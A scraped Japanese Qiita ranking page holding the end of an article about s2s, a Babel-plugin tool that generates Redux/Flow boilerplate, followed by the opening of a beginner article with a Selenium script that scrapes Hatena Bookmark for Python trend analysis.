<p>また、s2sはエディタにロックインされません。AtomでもVSCodeでも好きなエディタを使うことが出来ます。ただ、実行するだけです。</p>

<h2>
<span id="s2sの構成とconfigについて" class="fragment"></span><a href="#s2s%E3%81%AE%E6%A7%8B%E6%88%90%E3%81%A8config%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>s2sの構成とConfigについて</h2>

<p>s2sの実装はGitHubにあります。実は6ヶ月前からスクリプトとしてずっと使っていたんですが、無職ゆえ自分と知人以外使われてきませんでした。</p>

<p><a href="https://github.com/akameco/s2s" rel="nofollow noopener" target="_blank"><strong>akameco/s2s</strong><br>Source to Source</a></p>

<p>さて、ライブラリとしてのs2sの機能は大きく2つあります。<br>
1つはもう何度も登場しているs2sそのもの。<br>
もう1つは<strong>テンプレート展開</strong>です。<br>
ところでみなさん、Scaffoldやスニペットは好きですか？<br>
ええ、もちろん大嫌いです。アタマが悪いので覚えれないんですよねコマンド。<br>
テンプレート展開は、ファイルを生成する際にテンプレートで上書きします。特に手間がかからないわりに言葉以上に有効です。</p>

<p><a href="https://gyazo.com/91e13497dfe9692a37d397d6db413826" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/3d63107a63427d8553ea0930bec7d7fdc3234404/68747470733a2f2f692e6779617a6f2e636f6d2f39316531333439376466653936393261333764333937643664623431333832362e676966" alt="https://gyazo.com/91e13497dfe9692a37d397d6db413826" data-canonical-src="https://i.gyazo.com/91e13497dfe9692a37d397d6db413826.gif"></a></p>

<p>上記の例では、reducer.jsが生成された瞬間にテンプレートで上書きしています。また、reducer.jsが生成されたことによりs2sもトリガーし、<strong>type/state.js</strong>以下に<strong>State</strong>の型を追加し、ルートの<strong>reducer.js</strong>の<strong>combineReducers</strong>に追記します。これでStateの型とreducerがずれるなんてことはありませんね。もちろん、ファイルを削除すれば消えるので、そもそもルートのreducerやstateなどの型定義は開く必要も、意識する必要もないです。</p>

<p>機能の説明はこれで終わりです。</p>

<p>次に、設定ファイルの説明に入ります。<br>
s2sはルートに配置された<strong>s2s.config.js</strong>を設定ファイルとして扱います。webpack.config.jsのようなものだと思ってください。<br>
しかし設定する項目は非常に少ないです。</p>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">s2s.config.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'path'</span><span class="p">)</span>

<span class="kr">const</span> <span class="nx">rootDir</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">cwd</span><span class="p">(),</span> <span class="s1">'src'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">rootReducerPath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">rootDir</span><span class="p">,</span> <span class="s1">'reducer.js'</span><span class="p">)</span>


<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
  <span class="nx">watch</span><span class="o">:</span> <span class="s1">'./**/*.js'</span><span class="p">,</span>
  <span class="nx">plugins</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nx">test</span><span class="o">:</span> <span class="sr">/actionTypes.js$/</span><span class="p">,</span>
      <span class="nx">plugin</span><span class="o">:</span> <span class="p">[</span><span class="s1">'s2s-action-types'</span><span class="p">,</span> <span class="p">{</span> <span class="nx">removePrefix</span><span class="o">:</span> <span class="s1">'src/containers'</span> <span class="p">}],</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="nx">test</span><span class="o">:</span> <span class="sr">/actionTypes.js$/</span><span class="p">,</span>
      <span class="nx">output</span><span class="o">:</span> <span class="s1">'actions.js'</span><span class="p">,</span>
      <span class="nx">plugin</span><span class="o">:</span> <span class="p">[</span><span class="s1">'s2s-action-creater'</span><span class="p">],</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="nx">test</span><span class="o">:</span> <span class="sr">/reducer.js/</span><span class="p">,</span>
      <span class="nx">input</span><span class="o">:</span> <span class="nx">rootReducerPath</span><span class="p">,</span>
      <span class="nx">output</span><span class="o">:</span> <span class="nx">rootReducerPath</span><span class="p">,</span>
      <span class="nx">plugin</span><span class="o">:</span> <span class="p">[</span>
        <span class="s1">'s2s-reducer-root'</span><span class="p">,</span>
        <span class="p">{</span> <span class="nx">input</span><span class="o">:</span> <span class="s1">'src/containers/**/reducer.js'</span><span class="p">,</span> <span class="nx">output</span><span class="o">:</span> <span class="nx">rootReducerPath</span> <span class="p">},</span>
      <span class="p">],</span>
    <span class="p">},</span>
  <span class="p">],</span>
  <span class="nx">templates</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span> <span class="nx">test</span><span class="o">:</span> <span class="sr">/reducer.js/</span><span class="p">,</span> <span class="nx">input</span><span class="o">:</span> <span class="s1">'reducer.js'</span> <span class="p">},</span>
  <span class="p">],</span>
<span class="p">}</span>
</pre></div>
</div>

<h4>
<span id="watch" class="fragment"></span><a href="#watch"><i class="fa fa-link"></i></a>watch</h4>

<p>監視するファイルです。globパターンで指定します。</p>

<h4>
<span id="plugins" class="fragment"></span><a href="#plugins"><i class="fa fa-link"></i></a>plugins</h4>

<p>プラグインの配列です。いくつかの引数を取ります。</p>

<ul>
<li><p><strong>test</strong> トリガーとなるファイルを正規表現で指定します。他にオプションがなければそのままこのパスに出力されます。actionの型定義がこのパターンです。</p></li>
<li><p><strong>plugin</strong> バベルのプラグインを指定します。.babelrcの書き方と全く同じです。.babelrcと同様に引数を与えることも可能です。このプラグインにs2s特有の概念はありません。全ての<strong>BabelPlugin</strong>をそのまま使え、新し機能を追加したければ、単にBabelPluginを書けだけです。</p></li>
<li><p><strong>output</strong> トリガーと出力するパスが異なる場合に、このオプションを使います。相対パスを渡した場合、トリガーとなったファイルが起点の相対パスになります。root集約などは絶対パスで指定しています。</p></li>
<li><p><strong>input</strong> トリガーとなるファイルと異なるファイルを対象として変換を実行したい場合に指定します。reducerやStateのルート集約などに利用します。</p></li>
</ul>

<h4>
<span id="templates" class="fragment"></span><a href="#templates"><i class="fa fa-link"></i></a>templates</h4>

<p>テンプレートの配列です。いくつかの引数を取ります。</p>

<ul>
<li>
<strong>test</strong> トリガーなるパターンです。Pluginのオプションと同じです。</li>
<li>
<strong>input</strong> 配置したファイル名を指定します。デフォルトでは、ルートの<strong>templates</strong>以下に配置されたファイルを指定します</li>
</ul>

<h4>
<span id="templatesdir" class="fragment"></span><a href="#templatesdir"><i class="fa fa-link"></i></a>templatesDir</h4>

<p>テンプレートの起点を変更する際に指定します。例えば、<code>config/templates</code>以下にテンプレートを配置したいときなどです。</p>

<p>見たとおり、設定する項目は少ないです。また、単に<strong>Babel Plugin</strong>を使うため一切のロックインはありません。</p>

<p>新しくBabel Pluginを書いてみたい場合、以下の記事が参考になります。</p>

<p><strong>Babel Pluginを作成するときに有効な情報まとめ</strong><br>
<a href="https://qiita.com/akameco/items/af81882fabf2728f2567" class="autolink" id="reference-a7f388d78223260a5819">https://qiita.com/akameco/items/af81882fabf2728f2567</a></p>

<h2>
<span id="サンプルとreduxについて" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%81%A8redux%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>サンプルとreduxについて</h2>

<p>はじめましょう。<br>
以下のサンプルを<em>git clone</em>してください。</p>

<p><a href="https://github.com/akameco/s2s" rel="nofollow noopener" target="_blank"><strong>akameco/s2s:exmaple</strong></a></p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git clone git@github.com:akameco/s2s.git
</pre></div></div>

<p>よくあるショッピングカートのサンプルがあります。create-react-appを使っています。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ cd examples/shopping-cart
$ yarn
$ yarn start
</pre></div></div>

<p>s2sを起動しましょう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ yarn run s2s
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/0b6a78c5d376b0d0552c2915038b9b319782e249/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f64633161643837362d353763302d613866342d376364352d6465356532303533376634612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0b6a78c5d376b0d0552c2915038b9b319782e249/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f64633161643837362d353763302d613866342d376364352d6465356532303533376634612e706e67" alt="スクリーンショット 2017-09-24 00.30.36.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15319/dc1ad876-57c0-a8f4-7cd5-de5e20537f4a.png"></a></p>

<p>さて、実際もう説明することはありません。<br>
好きなように変更して<code>s2s</code>の動きを確認してみてください。<br>
例えば、App以下にActionTypes.jsを新規作成し、Addアクションを追加してみてください。</p>

<p><a href="https://gyazo.com/70b365152ef53158f9720298d35db4bb" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/9fb72019a8b19ab139387a4d1aa342dc182818ff/68747470733a2f2f692e6779617a6f2e636f6d2f37306233363531353265663533313538663937323032393864333564623462622e676966" alt="https://gyazo.com/70b365152ef53158f9720298d35db4bb" width="1078" data-canonical-src="https://i.gyazo.com/70b365152ef53158f9720298d35db4bb.gif"></a></p>

<p>コマンドラインには以下のように出力されます。イベントのパスと出力先のパスが表示されます。MacならCmd+クリックで対象のファイルがエディタで開けるので便利かもしれません。</p>

<p><a href="https://camo.qiitausercontent.com/fd5ceb5820e7bd658cd90d66e417f0e97716691e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f62626532353461662d383734322d623366372d363965372d3331393030633833663635362e706e67" target="_blank" rel="nofollow noopener"><img width="742" alt="スクリーンショット 2017-09-24 02.18.06.png" src="https://camo.qiitausercontent.com/fd5ceb5820e7bd658cd90d66e417f0e97716691e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f62626532353461662d383734322d623366372d363965372d3331393030633833663635362e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15319/bbe254af-8742-b3f7-69e7-31900c83f656.png"></a></p>

<p>さて、この変換を行っているのは、<a href="https://github.com/akameco/s2s/tree/master/packages/babel-plugin-s2s-initial-state-creater" rel="nofollow noopener" target="_blank"><strong>babel-plugin-s2s-action-creater</strong></a>というプラグインです。s2sの責務は、変換の対象とプラグインを接続しイベントをトリガーするだけなので、変換の責務は全てBabelPluginにあります。このプラグインのreadmeを見てましょう。</p>

<p><a href="https://camo.qiitausercontent.com/d84d1f097436937c59bef13aa3ec68ea0a680ec6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f36666438623837352d666537342d326162302d303733372d3234383534366133343432632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d84d1f097436937c59bef13aa3ec68ea0a680ec6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f36666438623837352d666537342d326162302d303733372d3234383534366133343432632e706e67" alt="スクリーンショット 2017-09-24 02.24.43.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15319/6fd8b875-fe74-2ab0-0737-248546a3442c.png"></a></p>

<p>一つ一つ分解すると単純ですね。<br>
このサンプルでは、6つのバベルプラグインを使っています。s2sはプラグイン含めて、モノレポで運用しているので、よかったら確認してみてください。</p>

<p><a href="https://github.com/akameco/s2s/tree/master/packages" rel="nofollow noopener" target="_blank"><strong>akameco/s2s-plugins</strong></a></p>

<p>また、reducerのテストケースの自動生成も可能です。<br>
詳しくは、以下のリンクを読んでください。</p>

<p><a href="https://qiita.com/akameco/items/66a2232df0e95e5bfe31" id="reference-9ad14c81c2d75fbb0c12"><strong>s2s: reduxにおけるreducerのテスト。あなたがテストを書く必要はないかも知れない</strong></a></p>

<p><a href="https://camo.qiitausercontent.com/7608c257a9f2502f162232498d612029186e94a5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f30336234386264642d626137652d643561612d656366382d3032653364366330373037662e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7608c257a9f2502f162232498d612029186e94a5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f30336234386264642d626137652d643561612d656366382d3032653364366330373037662e676966" alt="reducer-test.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15319/03b48bdd-ba7e-d5aa-ecf8-02e3d6c0707f.gif"></a></p>

<h3>
<span id="サンプルのreduxの構成について" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%81%AEredux%E3%81%AE%E6%A7%8B%E6%88%90%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>サンプルのreduxの構成について</h3>

<p>話はかわりますが、この生成されるflowの型付け方法やreduxの構成は、個人的なベストプラクティスでもあります。基本的な構成はコンテナベースで、action、reducer含め全てをコンテナに閉じ、同一ディレクトリに<strong>reducer.test.js</strong>のような形式でテストを書きます。Actionはディレクトリ名のプレフィックスを付けます。これで完全に一意なアクションになるので、取り違えは起こりえません。またstring型ではなくstring literal型を使います。これについては以下の記事を読んでください。本来であれば書くのが面倒でありますが、s2sがある現在ボイラープレートは味方です。<br>
<strong>flowtypeのactionの型付け。String Literal型とString型について</strong><br>
<a href="https://qiita.com/akameco/items/e7021e22da4c9e14463a" class="autolink" id="reference-ac162e0df63cdef91c0c">https://qiita.com/akameco/items/e7021e22da4c9e14463a</a></p>

<p>テンプレートより生成されるreducerは<strong>T &amp; $Shape</strong>型で型を付けます。詳しくは、以下の記事を確認してください。<br>
<strong>Flowtype+reduxにおけるreducerの正しい型付け</strong><br>
<a href="https://qiita.com/akameco/items/fe7ba22c158a2593b077" class="autolink" id="reference-b718b2e077dd7c7d1bf3">https://qiita.com/akameco/items/fe7ba22c158a2593b077</a></p>

<p>また、reduxのミドルウェアはredux-thunkです。これだけ先に記事を書いておくのを忘れました。なぜredux-sagaを使うことを辞めたのかを含め、後でこの選択をした理由の記事を上げる予定です。</p>

<h2>
<span id="予想される質問とその回答" class="fragment"></span><a href="#%E4%BA%88%E6%83%B3%E3%81%95%E3%82%8C%E3%82%8B%E8%B3%AA%E5%95%8F%E3%81%A8%E3%81%9D%E3%81%AE%E5%9B%9E%E7%AD%94"><i class="fa fa-link"></i></a>予想される質問とその回答</h2>

<h3>
<span id="typescriptのサポートは" class="fragment"></span><a href="#typescript%E3%81%AE%E3%82%B5%E3%83%9D%E3%83%BC%E3%83%88%E3%81%AF"><i class="fa fa-link"></i></a>TypeScriptのサポートは？</h3>

<hr>

<p>11/8 追記<br>
デフォルトでサポートしました。設定なしで、pluginを指定すればtypescriptに対して動きます。</p>

<p>11/06 追記<br>
Yeｓ. サポートしました 🎉<br>
</p><blockquote class="twitter-tweet">
<p>s2sのTypeScript対応完了した。ts-handlerを渡すとTSに対してs2sが発動する <a href="https://t.co/giXFcYTFrb" rel="nofollow noopener" target="_blank">pic.twitter.com/giXFcYTFrb</a></p>— あかめ@無職.js (@akameco) <a href="https://twitter.com/akameco/status/927225088658698240?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">November 5, 2017</a>
</blockquote><br>


<p>が、まだプラグインがありません。<br>
もし、TS用のプラグインを作成した方がいれば、教えて頂けると嬉しいです。<br>
それと上記のツイートでは、<code>s2s-ts-handler</code>ですが、<code>s2s-handler-typescript</code>にリネームしました。</p>

<p>追記終わり</p>

<hr>

<p><s>No. Just Use FlowType.</s></p>

<p><a href="http://thejameskyle.com/adopting-flow-and-typescript.html" rel="nofollow noopener" target="_blank">Adopting Flow &amp; TypeScript – @thejameskyle</a></p>

<p><s>冗談はさておき、Babel6だとTypeScriptは解釈されません。TypeScriptユーザは、Babel7のリリースを待つことになります。</s></p>

<h3>
<span id="issueやプルリク" class="fragment"></span><a href="#issue%E3%82%84%E3%83%97%E3%83%AB%E3%83%AA%E3%82%AF"><i class="fa fa-link"></i></a>Issueやプルリク</h3>

<p>日本語だと嬉しいです。英語でもいいですが、Google翻訳アシストの謎い英文を返すマシーンとなります。</p>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<p>s2sについて、概念や使い方についてまとめました。<br>
s2sがあなたのプロジェクトの力になることがあれば嬉しいです。<br>
もし気にいってくだされば、スターを貰えると励みになります。</p>

<p><a href="https://github.com/akameco/s2s" rel="nofollow noopener" target="_blank"><strong>akameco/s2s</strong><br>Source to Source</a></p>

<p>兎にも角にもASTの時代です。人間のやることや書くことがどんどん減っていけば最高ですね。<br>
何かあれば、コメント欄またはツイッターにて議論しましょう。</p>

<blockquote class="twitter-tweet">
<p>今この一瞬日本で一番高速にflow+reduxのアクションを書ける自信がある</p>— 無職.js (@akameco) <a href="https://twitter.com/akameco/status/910379500759801856" rel="nofollow noopener" target="_blank">September 20, 2017</a>
</blockquote>



<blockquote class="twitter-tweet">
<p>僕が辿りついた最高のflowtype+reduxです <a href="https://t.co/FISlpW9OpE" rel="nofollow noopener" target="_blank">https://t.co/FISlpW9OpE</a> <a href="https://twitter.com/hashtag/redux?src=hash" rel="nofollow noopener" target="_blank">#redux</a> <a href="https://t.co/YXujSJawsC" rel="nofollow noopener" target="_blank">pic.twitter.com/YXujSJawsC</a></p>— 無職.js (@akameco) <a href="https://twitter.com/akameco/status/911566655641182208" rel="nofollow noopener" target="_blank">September 23, 2017</a>
</blockquote>

<blockquote class="twitter-tweet">
<p>ほとんど理想のreduxになってきた。もう少し自動生成できる部分があるけど <a href="https://t.co/hedRGsTkIM" rel="nofollow noopener" target="_blank">pic.twitter.com/hedRGsTkIM</a></p>— あかめ@無職.js (@akameco) <a href="https://twitter.com/akameco/status/916479997744889856?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">October 7, 2017</a>
</blockquote>

<h2>
<span id="お知らせ-html5カンファレンス" class="fragment"></span><a href="#%E3%81%8A%E7%9F%A5%E3%82%89%E3%81%9B-html5%E3%82%AB%E3%83%B3%E3%83%95%E3%82%A1%E3%83%AC%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>お知らせ HTML5カンファレンス</h2>

<p>本日9/24にあるHTML5カンファレンスでデモ展示をする予定です。一応、一日中いる予定ですので、気軽に声をかけてくださると嬉しいです。自分のデモの内容は一番上に貼ってあるGIFの無限リピートとこの記事へのリンクを張っておくだけなので面白みはないですが、他のメンバーが何か面白い展示をしてくれるはずですのでよろしくお願いします。</p>

<p>10/2 追記 デモに来てくれたみなさん。本当にありがとうございました。非常に勉強になりました。出来る限りフォローを返したつもりですが、もしフォロー返されてないなどありましたら、一声かけてくれると嬉しいです。</p>

<p><a href="https://github.com/akameco/s2s" rel="nofollow noopener" target="_blank"><br>
<img width="388" alt="スクリーンショット 2017-09-24 00.05.28.png" src="https://camo.qiitausercontent.com/ad8bc9210bbc005c89c548fae28ada89046f6e75/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f35616238613530332d343565392d323530662d633238362d3561646663356365653732632e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15319/5ab8a503-45e9-250f-c286-5adfc5cee72c.png"><br>
</a></p>

<h2>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h2>

<p><a href="https://github.com/akameco/s2s" rel="nofollow noopener" target="_blank"><strong>akameco/s2s</strong> - Source to Source</a></p>

<p><strong>flowtypeのactionの型付け。String Literal型とString型について</strong><br>
<a href="https://qiita.com/akameco/items/e7021e22da4c9e14463a" class="autolink">https://qiita.com/akameco/items/e7021e22da4c9e14463a</a></p>

<p><strong>Flowtype+reduxにおけるreducerの正しい型付け</strong><br>
<a href="https://qiita.com/akameco/items/fe7ba22c158a2593b077" class="autolink">https://qiita.com/akameco/items/fe7ba22c158a2593b077</a></p>

<p><strong>s2s: reduxにおけるreducerのテスト。あなたがテストを書く必要はないかも知れない</strong><br>
<a href="https://qiita.com/akameco/items/66a2232df0e95e5bfe31">https://qiita.com/akameco/items/66a2232df0e95e5bfe31</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">71位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>151</kbd>
		<a target="_blank" href="https://qiita.com/kkdmgs110/items/954267e168233ee3028e">【Python】スクレイピング→データ収集→整形→分析までの流れを初心者向けにまとめておく ～Pythonに関するはてな記事を10年分スクレイピングし、Pythonトレンド分析を実際にやってみた～</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-11<br />15:15:34</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/134704.html">kkdmgs110</a>(24件の記事)<br />(Not in Education, or Employment.inc 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/134704/profile-images/1473719386">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[スクレイピング]</b> <b>[pandas]</b> <b>[データ分析]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="やりたいこと" class="fragment"></span><a href="#%E3%82%84%E3%82%8A%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>やりたいこと</h1>

<ul>
<li>はてなブックマークで、Python記事を検索しトレンドを分析

<ul>
<li>はてなブックマークにSeleniumでログイン</li>
<li>ブックマーク数をスクレイピング</li>
<li>時系列比較を行う</li>
<li>バズるタイトルを分析</li>
</ul>
</li>
</ul>

<h1>
<span id="実装方法" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>実装方法</h1>

<ul>
<li>詳しくは下記記事を参考にしてください。Pandasを利用したデータ分析まで載せています。</li>
</ul>

<p>【Python】スクレイピング→データ収集→整形→分析までの流れを初心者向けにまとめておく ～Pythonに関するはてな記事を10年分スクレイピングし、Pythonトレンド分析を実際にやってみた～</p>

<p><a href="https://review-of-my-life.blogspot.jp/2017/10/python-web-scraping-data-collection-analysis.html" class="autolink" rel="nofollow noopener" target="_blank">https://review-of-my-life.blogspot.jp/2017/10/python-web-scraping-data-collection-analysis.html</a></p>

<h1>
<span id="実装" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>実装</h1>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">trendAnalytics.py</span></div>
<div class="highlight"><pre><span></span>
<span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>  
<span class="kn">from</span> <span class="nn">pandas</span> <span class="kn">import</span> <span class="o">*</span> 
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1">#Access to page</span>

<span class="n">browser</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">PhantomJS</span><span class="p">()</span>  <span class="c1"># DO NOT FORGET to set path</span>
<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://b.hatena.ne.jp/search/text?safe=on&amp;q=Python&amp;users=50"</span>
<span class="n">browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">df</span> <span class="o">=</span> <span class="n">pandas</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="s1">'trend.csv'</span><span class="p">,</span> <span class="n">index_col</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#Insert title,date,bookmarks into CSV file</span>

<span class="n">page</span> <span class="o">=</span> <span class="mi">1</span> <span class="c1">#This number shows the number of current page later</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span> <span class="c1">#continue until getting the last page</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">browser</span><span class="o">.</span><span class="n">find_elements_by_css_selector</span><span class="p">(</span><span class="s2">".pager-next"</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"######################page: {} ########################"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">page</span><span class="p">))</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"Starting to get posts..."</span><span class="p">)</span>
        <span class="c1">#get all posts in a page</span>
        <span class="n">posts</span> <span class="o">=</span> <span class="n">browser</span><span class="o">.</span><span class="n">find_elements_by_css_selector</span><span class="p">(</span><span class="s2">".search-result"</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">post</span> <span class="ow">in</span> <span class="n">posts</span><span class="p">:</span>
            <span class="n">title</span> <span class="o">=</span> <span class="n">post</span><span class="o">.</span><span class="n">find_element_by_css_selector</span><span class="p">(</span><span class="s2">"h3"</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
            <span class="n">date</span> <span class="o">=</span> <span class="n">post</span><span class="o">.</span><span class="n">find_element_by_css_selector</span><span class="p">(</span><span class="s2">".created"</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
            <span class="n">bookmarks</span> <span class="o">=</span> <span class="n">post</span><span class="o">.</span><span class="n">find_element_by_css_selector</span><span class="p">(</span><span class="s2">".users span"</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
            <span class="n">se</span> <span class="o">=</span> <span class="n">pandas</span><span class="o">.</span><span class="n">Series</span><span class="p">([</span><span class="n">title</span><span class="p">,</span> <span class="n">date</span><span class="p">,</span> <span class="n">bookmarks</span><span class="p">],[</span><span class="s1">'title'</span><span class="p">,</span><span class="s1">'date'</span><span class="p">,</span><span class="s1">'bookmarks'</span><span class="p">])</span>
            <span class="n">df</span> <span class="o">=</span> <span class="n">df</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">se</span><span class="p">,</span> <span class="n">ignore_index</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">df</span><span class="p">)</span>

        <span class="c1">#after getting all posts in a page, click pager next and then get next all posts again</span>

        <span class="n">btn</span> <span class="o">=</span> <span class="n">browser</span><span class="o">.</span><span class="n">find_element_by_css_selector</span><span class="p">(</span><span class="s2">"a.pager-next"</span><span class="p">)</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s2">"href"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"next url:{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">btn</span><span class="p">))</span>
        <span class="n">browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">btn</span><span class="p">)</span>
        <span class="n">page</span><span class="o">+=</span><span class="mi">1</span>
        <span class="n">browser</span><span class="o">.</span><span class="n">implicitly_wait</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"Moving to next page......"</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span> <span class="c1">#if no pager exist, stop.</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"no pager exist anymore"</span><span class="p">)</span>
        <span class="k">break</span>
<span class="n">df</span><span class="o">.</span><span class="n">to_csv</span><span class="p">(</span><span class="s2">"trend1.csv"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"DONE"</span><span class="p">)</span>

</pre></div>
</div>

<h1>
<span id="結果" class="fragment"></span><a href="#%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a>結果</h1>

<ul>
<li>こんな感じでスクレイピングした結果が表示されます。</li>
</ul>

<p><a href="https://camo.qiitausercontent.com/a7eb99eec298c9eadb8bbd461d05971570be4e5b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133343730342f31386137636336632d653433652d393162622d323331622d3862333063323832663266662e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a7eb99eec298c9eadb8bbd461d05971570be4e5b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133343730342f31386137636336632d653433652d393162622d323331622d3862333063323832663266662e676966" alt="trendAnalytics.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/134704/18a7cc6c-e43e-91bb-231b-8b30c282f2ff.gif"></a></p>

<ul>
<li>Jupiter Notebookを利用して、こんな感じで分析しました.2017年度の結果</li>
</ul>

